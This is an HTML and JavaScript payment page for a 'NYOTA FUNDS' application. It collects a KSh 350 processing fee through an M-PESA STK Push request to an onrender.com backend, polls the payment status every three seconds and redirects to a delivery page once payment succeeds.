<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>NYOTA FUNDS</title>

<style>
    /* Import the Mali font used throughout the page */
    @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

    *{
        box-sizing:border-box;
    }

    /* Main page background and text styling */
    body{
        margin:0;
        padding:16px 10px;
        font-family:'Mali',sans-serif;
        background:#0B0217;
        color:#fff;
    }

    /* Keeps the payment card mobile-friendly */
    .container{
        width:100%;
        max-width:430px;
        margin:0 auto;
    }

    /* Main payment card */
    .card{
        width:100%;
        background:
            linear-gradient(
                145deg,
                rgba(255,255,255,0.09),
                rgba(255,255,255,0.035)
            );

        padding:22px 18px 18px;
        border-radius:18px;

        box-shadow:
            0 20px 60px rgba(0,0,0,0.45),
            inset 0 1px 0 rgba(255,255,255,0.05);

        border:1px solid rgba(255,255,255,0.10);
    }

    h1{
        text-align:center;
        color:#D4AF37;
        font-size:22px;
        font-weight:700;
        margin:2px 0 16px;
    }

    p{
        text-align:center;
        font-size:14px;
        line-height:1.5;
        color:rgba(255,255,255,0.72);
    }

    /* Displays the processing fee */
    .amount{
        background:rgba(212,175,55,0.055);
        border:1px solid rgba(212,175,55,0.25);
        border-radius:12px;
        padding:14px 10px;
        font-size:20px;
        font-weight:700;
        text-align:center;
        color:#fff;
        margin:18px 0;
    }

    label{
        display:block;
        margin-top:15px;
        margin-bottom:7px;
        font-size:14px;
        font-weight:700;
        color:rgba(255,255,255,0.88);
    }

    input{
        width:100%;
        padding:14px 12px;
        border:1px solid rgba(255,255,255,0.12);
        border-radius:10px;
        font-size:16px;
        font-family:'Poppins',sans-serif;
        background:rgba(255,255,255,0.07);
        color:#fff;
        outline:none;
    }

    input:focus{
        border-color:rgba(212,175,55,0.8);
        box-shadow:0 0 0 3px rgba(212,175,55,0.10);
    }

    /* Payment button */
    button{
        width:100%;
        padding:15px;
        margin-top:17px;

        background:
            linear-gradient(
                135deg,
                #D4AF37,
                #A67C00
            );

        color:#0B0217;
        border:none;
        border-radius:11px;
        font-family:'Poppins',sans-serif;
        font-size:16px;
        font-weight:700;
        cursor:pointer;

        box-shadow:
            0 10px 30px rgba(212,175,55,0.20),
            inset 0 1px 0 rgba(255,255,255,0.55);
    }

    button:hover{
        background:
            linear-gradient(
                135deg,
                #D4AF37,
                #A67C00
            );
    }

    button:active{
        transform:scale(.98);
    }

    /* Prevents multiple STK Push requests while one is processing */
    button:disabled{
        background:rgba(255,255,255,0.25);
        color:#fff;
        cursor:not-allowed;
        box-shadow:none;
    }

    /* Displays payment progress and result messages */
    #stkMessage{
        min-height:20px;
        margin-top:13px;
        color:#D4AF37;
        font-size:13px;
        font-weight:600;
        line-height:1.5;
    }

    /* Small-screen adjustments */
    @media(max-width:360px){

        body{
            padding:10px 7px;
        }

        .card{
            padding:18px 13px 15px;
            border-radius:15px;
        }

        h1{
            font-size:20px;
        }

        button{
            padding:14px;
            font-size:15px;
        }

    }
</style>

</head>

<body>

<div class="container">

<div class="card">

<h1>PROCESSING FEE</h1>

<p>
Welcome, <strong><span id="name"></span></strong>
</p>

<p>
To continue with your NYOTA Fund application, please complete the processing fee payment below.
</p>

<!-- Processing fee selected during the previous application step -->
<div class="amount" id="feeAmount">
    Processing Fee: KSh 350
</div>

<!-- Applicant's name is loaded automatically from localStorage -->
<label>Full Name</label>

<input type="text" id="fullName" readonly>

<!-- Applicant enters the M-PESA number that will receive the STK Push -->
<label>M-PESA Phone Number</label>

<input
    type="tel"
    id="phone"
    placeholder="2547XXXXXXXX"
>

<!-- Starts the STK Push process -->
<button id="payBtn" onclick="payNow()">
    Pay Processing Fee
</button>

<!-- Payment status messages appear here -->
<p id="stkMessage"></p>

</div>

</div>

<script>

/*
=========================================================
LOAD APPLICANT INFORMATION
=========================================================
The applicant's name was saved earlier in localStorage.

We use it here so the applicant does not have to enter
their name again.
*/

let applicant = localStorage.getItem("applicantName");

document.getElementById("name").innerHTML =
    applicant || "Applicant";

document.getElementById("fullName").value =
    applicant || "";


/*
=========================================================
LOAD PROCESSING FEE
=========================================================
The selected processing fee is retrieved from localStorage.

If no fee has been saved, KSh 350 is used as the default.
*/

let processingFee =
    localStorage.getItem("processingFee") || "350";

document.getElementById("feeAmount").innerHTML =
    "Processing Fee: KSh " +
    Number(processingFee).toLocaleString();


/*
=========================================================
START PAYMENT / STK PUSH
=========================================================
This function:

1. Gets the applicant's M-PESA number.
2. Saves the phone number.
3. Saves the applicant's name.
4. Sends the STK Push request to the backend.
5. Receives the transaction ID.
6. Starts checking the payment status.
*/

async function payNow() {

    // Get the phone number entered by the applicant
    let phone =
        document.getElementById("phone").value.trim();


    /*
    Save the phone number so it can be reused on
    later pages such as delivery.html.
    */
    localStorage.setItem(
        "phoneNumber",
        phone
    );


    /*
    Save the applicant's full name for use on
    subsequent pages.
    */
    localStorage.setItem(
        "fullName",
        document.getElementById("fullName").value
    );


    // Get the payment button
    let btn =
        document.getElementById("payBtn");


    /*
    Make sure the applicant has entered a phone number
    before attempting to send an STK Push.
    */
    if (phone === "") {

        alert(
            "Please enter your M-PESA phone number."
        );

        return;
    }


    /*
    Disable the button temporarily so the applicant
    cannot accidentally send multiple STK Push requests.
    */
    btn.innerHTML =
        "Sending STK Push...";

    btn.disabled = true;


    try {

        /*
        =====================================================
        SEND STK PUSH TO NYOTA BACKEND
        =====================================================

        IMPORTANT:
        This is your existing backend endpoint.

        The frontend sends:
        - phone
        - processing fee amount
        */

        let response = await fetch(
            "https://nyota-funds-backend.onrender.com/stk-push",
            {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({

                    // M-PESA number receiving the STK Push
                    phone: phone,

                    // Processing fee being paid
                    amount:
                        Number(processingFee)
                })
            }
        );


        // Convert backend response into JSON
        let data =
            await response.json();


        // Useful for checking the backend response in the browser console
        console.log(
            "STK RESPONSE:",
            data
        );


        /*
        If the backend reports that the STK Push failed,
        stop the payment process and display the error.
        */
        if (!response.ok || !data.success) {

            throw new Error(
                data.message ||
                "STK Push failed"
            );
        }


        /*
        =====================================================
        GET TRANSACTION ID
        =====================================================

        The transaction ID is needed to check whether
        the applicant has completed the payment.
        */

        let transactionId =
            data.transactionId ||
            data.checkout_request_id;


        /*
        If no transaction ID was returned, we cannot
        safely continue checking payment status.
        */
        if (!transactionId) {

            throw new Error(
                "No Paylor transaction ID received"
            );
        }


        /*
        STK Push has been successfully sent.

        Now we wait for the applicant to enter their
        M-PESA PIN and complete the payment.
        */

        btn.innerHTML =
            "Processing...";


        document.getElementById(
            "stkMessage"
        ).innerHTML =
            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";


        /*
        Start checking the transaction status.
        */
        checkPayment(
            transactionId
        );


    } catch (error) {

        /*
        =====================================================
        PAYMENT ERROR
        =====================================================
        If something goes wrong while sending the STK Push,
        show the error and allow the applicant to try again.
        */

        console.log(
            "PAYMENT ERROR:",
            error
        );


        alert(
            error.message ||
            "Payment request failed."
        );


        // Restore the payment button
        btn.innerHTML =
            "Pay Processing Fee";

        btn.disabled = false;
    }
}


/*
=========================================================
CHECK PAYMENT STATUS
=========================================================
This function checks the backend every 3 seconds.

When the payment becomes COMPLETED:
→ Stop checking
→ Show success message
→ Redirect to delivery.html

When the payment becomes CANCELLED or FAILED:
→ Stop checking
→ Show failure message
→ Allow another attempt
*/

async function checkPayment(
    transactionId
) {

    /*
    Check the payment status every 3 seconds.
    */
    let interval =
        setInterval(async () => {

            try {

                /*
                =================================================
                ASK BACKEND FOR PAYMENT STATUS
                =================================================
                */

                let response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method: "POST",

                            headers: {
                                "Content-Type":
                                    "application/json"
                            },

                            body:
                                JSON.stringify({

                                    // Transaction being checked
                                    transactionId:
                                        transactionId
                                })
                        }
                    );


                // Convert response into JSON
                let result =
                    await response.json();


                // Display status in browser console for debugging
                console.log(
                    "PAYMENT STATUS:",
                    result
                );


                /*
                If the backend has not returned valid
                payment information yet, continue checking.
                */
                if (
                    !result.success ||
                    !result.data
                ) {
                    return;
                }


                // Store payment information
                let payment =
                    result.data;


                // Convert status to uppercase for reliable comparison
                let status =
                    String(
                        payment.status || ""
                    ).toUpperCase();


                /*
                =================================================
                PAYMENT SUCCESSFUL
                =================================================
                */

                if (
                    status === "COMPLETED"
                ) {

                    // Stop checking because payment is complete
                    clearInterval(
                        interval
                    );


                    // Inform applicant that payment succeeded
                    document.getElementById(
                        "stkMessage"
                    ).innerHTML =
                        "✅ Payment successful. Redirecting...";


                    /*
                    Move the applicant to the next step
                    of the Nyota Funds application.
                    */
                    window.location.href =
                        "delivery.html";
                }


                /*
                =================================================
                PAYMENT FAILED OR CANCELLED
                =================================================
                */

                else if (
                    status === "CANCELLED" ||
                    status === "FAILED"
                ) {

                    // Stop checking this transaction
                    clearInterval(
                        interval
                    );


                    // Show payment result
                    document.getElementById(
                        "stkMessage"
                    ).innerHTML =
                        "❌ Payment " +
                        status.toLowerCase() +
                        ".";


                    /*
                    Allow the applicant to try the
                    payment again.
                    */
                    document.getElementById(
                        "payBtn"
                    ).disabled = false;


                    document.getElementById(
                        "payBtn"
                    ).innerHTML =
                        "Pay Processing Fee";
                }


            } catch (error) {

                /*
                Temporary status-checking errors are logged
                but the interval continues trying.
                */

                console.log(
                    "STATUS ERROR:",
                    error
                );

            }

        }, 3000);

}

</script>

</body>

</html>
